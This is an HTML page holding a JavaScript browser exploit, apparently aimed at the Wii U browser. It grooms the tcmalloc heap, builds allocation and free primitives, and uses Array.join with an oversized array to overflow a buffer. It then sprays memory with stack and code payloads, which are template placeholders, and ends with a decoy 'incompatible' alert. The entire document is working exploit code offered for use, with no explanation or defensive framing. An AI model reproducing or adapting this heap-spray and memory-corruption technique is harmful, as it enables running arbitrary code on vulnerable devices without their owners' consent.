<br clear="all"/>
<script>
// Alloc primitive.
function pow2str(p, b) {
  var str = String.fromCharCode(b);
  for (; p; p--){
  document.createElement("link");
    str += str;
  }
  return str;
}

function alloc(n, b) {
  var res = '';
  for(var i = 0; i < 32; i++){
    if(n & 0x1)
      res += pow2str(i, b);
    n >>= 1;
  }
  //flatten
  res[0];
  return res;
}

function sprayInc(n) {            
{{ stack }}

    var h1 = [];
    h1[0] = str.substring(0, str.length);

    for (i = 1; i <= n; i++)
	h1[i] = unescape(h1[0]);

    return h1;
}

function sprayCode(n) {              
{{ code }}
	
	var h1 = [];
	h1[0] = str.substring(0, str.length);
					
	for (i = 1; i <= n; i++)
		h1[i] = unescape(h1[0]);
		
	return h1;
}
	
// Format uint32.
function uint32(value){
  var s = '';
  for (var i = 0; i < 4; i++) {
    s += String.fromCharCode((value >> (i * 8)) & 0xff);
  }
  return s;
}

// Memory placeholder.
holder = [];

// Allocate the overwrite string.
unbound_payload = uint32(0xffffffff);
overwrite_string = alloc(0x1A0, 0) + unbound_payload;

// Flatten overwrite_string.
holder.push(overwrite_string[0]);

// Build the overwrite array.
arr = [];

// Array to be joined.
// 0x10000 * 0x10000 + 0x1A0 + 0x4 = 0x1000001A4
// Buffer size is 0x1A4.
function build_arr() { 
  arr.length = 0;
  arr.push(overwrite_string);
  for (var i = 0; i < 0x10000; i++) {
    arr.push(long_string);
  }
}

// Free primitive.
var force_alloc_and_free = {
  toString: build_arr
};

var force_arr = [];
force_arr.push(force_alloc_and_free);
for (var i = 1; i < 0x1A4/4; i++)
{
  force_arr.push('');
}

// Force allocations to trick tcmalloc.
for(var i = 0; i < 1635; i++) {
  holder.push(alloc(0x1A0 - 0x20, 1));
}


// Allocate infoleak string.
target = alloc(0x1A0 - 0x20, 2);

// Allocate long string.
long_string = alloc(0x10004, 6944); // Decimal of the half-address which is repeated. Ex: 0x1B20 = 0x1B201B20

// Make and free 0x1A4 bytes.
force_arr.join();

var pointer = sprayInc(420);
var code = sprayCode(300);

arr.join();

alert("Your Wii U is incompatible.");

</script>
